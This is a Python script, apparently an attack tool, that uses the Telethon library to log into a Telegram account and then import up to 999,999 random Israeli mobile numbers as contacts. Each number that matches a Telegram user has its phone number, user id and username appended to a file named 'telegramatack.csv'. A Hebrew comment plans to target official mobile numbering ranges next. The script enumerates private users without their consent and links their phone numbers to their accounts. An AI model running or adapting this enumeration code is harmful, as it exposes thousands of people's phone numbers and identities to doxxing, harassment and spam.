from telethon.sync import TelegramClient
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.types import InputPeerEmpty, InputPeerChannel, InputPeerUser
from telethon.errors.rpcerrorlist import PeerFloodError, UserPrivacyRestrictedError
from telethon.tl.functions.channels import InviteToChannelRequest
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.contacts import ImportContactsRequest
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.types import InputPhoneContact
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError
from telethon import utils
import sys
import csv
import traceback
import time
import random
import datetime
import logging

logging.basicConfig(level=logging.INFO)



api_id = int
api_hash = 'str'

phone = 'str'
client = TelegramClient(phone, api_id, api_hash, auto_reconnect=True, connection_retries=9999)

client.connect()
try:
   if not client.is_user_authorized():
       client.send_code_request(phone)
       client.sign_in(phone, input('Enter the code: '))
except SessionPasswordNeededError:
    client.sign_in(password='str')


"""
phone = random phone numbers. configure your own.
client id must be random

Future updates == להשתמש ולהתאים את הסקריפט לפי טווחי מספור ניידים
טווחי מספור ניידים = https://data.gov.il/dataset/assigning-mobile-numbering-ranges/resource/caa80822-5880-4bbf-808a-06d7f53c4ae5
"""

count = 0000	
for _ in range(999999):
        try:
           phone = '97253' + str(random.randrange(1111111, 9999999))
           count +=1
           client(ImportContactsRequest(
           contacts=[InputPhoneContact(
           client_id=random.randrange(123456789, 999999999),
           phone='+'+str(phone),
           first_name='b' + str(count),
           last_name='none')]))

     
           print(f'adding {phone} as {count}')
           time.sleep(10)
           usertoforward = client.get_entity((phone)).username
           usertoforward1 = client.get_entity((phone))
           usertoforward2 = client.get_entity((phone)).id
           with open("telegramatack.csv","a",encoding='UTF-8') as f:
              writer = csv.writer(f,delimiter=",",lineterminator="\n")
              writer.writerow(['phone', 'id', 'username'])
              # extra header between every row
              print('i caguht one!')
              print(f'round number : {count}\n phone added: {phone}\n username: {usertoforward}')
              writer.writerow([phone, usertoforward2, usertoforward])
        except ValueError:
            print('no entity found')
            continue
        except:
            traceback.print_exc()  
            continue






